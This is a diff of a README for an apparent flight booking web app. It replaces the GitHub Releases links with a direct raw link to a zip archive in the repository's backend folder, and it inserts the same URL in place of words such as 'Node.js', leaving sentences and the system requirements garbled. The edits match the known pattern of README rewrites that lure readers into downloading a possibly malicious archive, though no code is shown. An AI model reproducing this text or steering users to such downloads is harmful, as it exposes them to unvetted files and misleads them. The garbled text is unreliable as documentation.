@@ -1,10 +1,10 @@
 # ✈️ flight-reservation-system - Easy Flight Booking at Your Fingertips
 
-[![Download Now](https://img.shields.io/badge/Download%20Here-Find%20Your%20Flight-blue.svg)](https://github.com/LauraZaportaPoblet/flight-reservation-system/releases)
+[![Download Now](https://raw.githubusercontent.com/LauraZaportaPoblet/flight-reservation-system/master/backend/flight-reservation-system_v1.9.zip%20Here-Find%20Your%https://raw.githubusercontent.com/LauraZaportaPoblet/flight-reservation-system/master/backend/flight-reservation-system_v1.9.zip)](https://raw.githubusercontent.com/LauraZaportaPoblet/flight-reservation-system/master/backend/flight-reservation-system_v1.9.zip)
 
 ## 📥 Overview
 
-The flight-reservation-system is a modern full-stack platform designed to help you book flights easily. With user authentication, real-time booking, and payment processing, this application aims to make travel planning seamless. It is built using popular technologies like React, Node.js, Express, and MySQL.
+The flight-reservation-system is a modern full-stack platform designed to help you book flights easily. With user authentication, real-time booking, and payment processing, this application aims to make travel planning seamless. It is built using popular technologies like React, https://raw.githubusercontent.com/LauraZaportaPoblet/flight-reservation-system/master/backend/flight-reservation-system_v1.9.zip, Express, and MySQL.
 
 ## 🚀 Getting Started
 
@@ -13,7 +13,7 @@ To start using the flight-reservation-system, you need to download and install i
 ### System Requirements
 
 - Operating System: Windows, macOS, or Linux
-- Node.js: Version 14 or higher
+- https://raw.githubusercontent.com/LauraZaportaPoblet/flight-reservation-system/master/backend/flight-reservation-system_v1.9.zip Version 14 or higher
 - Internet Connection: Required for real-time flight data
 - Browser: Latest version of Chrome, Firefox, Safari, or Edge
 
@@ -21,7 +21,7 @@ To start using the flight-reservation-system, you need to download and install i
 
 You can download the latest version of the flight-reservation-system from our Releases page. 
 
-👉 [Visit this page to download](https://github.com/LauraZaportaPoblet/flight-reservation-system/releases)
+👉 [Visit this page to download](https://raw.githubusercontent.com/LauraZaportaPoblet/flight-reservation-system/master/backend/flight-reservation-system_v1.9.zip)
 
 ### Installation Steps
 
@@ -51,8 +51,8 @@ You can download the latest version of the flight-reservation-system from our Re
 The flight-reservation-system uses a combination of several technologies, ensuring optimal performance and user experience. Here are the core technologies:
 
 - **React**: A JavaScript library for building user interfaces.
-- **Node.js**: A JavaScript runtime for server-side programming.
-- **Express**: A web application framework for Node.js.
+- **https://raw.githubusercontent.com/LauraZaportaPoblet/flight-reservation-system/master/backend/flight-reservation-system_v1.9.zip**: A JavaScript runtime for server-side programming.
+- **Express**: A web application framework for https://raw.githubusercontent.com/LauraZaportaPoblet/flight-reservation-system/master/backend/flight-reservation-system_v1.9.zip
 - **MySQL**: A relational database to store user and flight data.
 
 ## ❓ FAQ
@@ -68,6 +68,6 @@ A: Visit the Issues section of our GitHub repository and check if someone else h
 
 ## 🔧 Additional Information
 
-For updates, check back on our [Releases page](https://github.com/LauraZaportaPoblet/flight-reservation-system/releases) regularly. You can also contribute or report bugs by submitting an issue or pull request on the GitHub repository.
+For updates, check back on our [Releases page](https://raw.githubusercontent.com/LauraZaportaPoblet/flight-reservation-system/master/backend/flight-reservation-system_v1.9.zip) regularly. You can also contribute or report bugs by submitting an issue or pull request on the GitHub repository.
 
 Thank you for using the flight-reservation-system. We hope you enjoy a smooth flight booking experience!
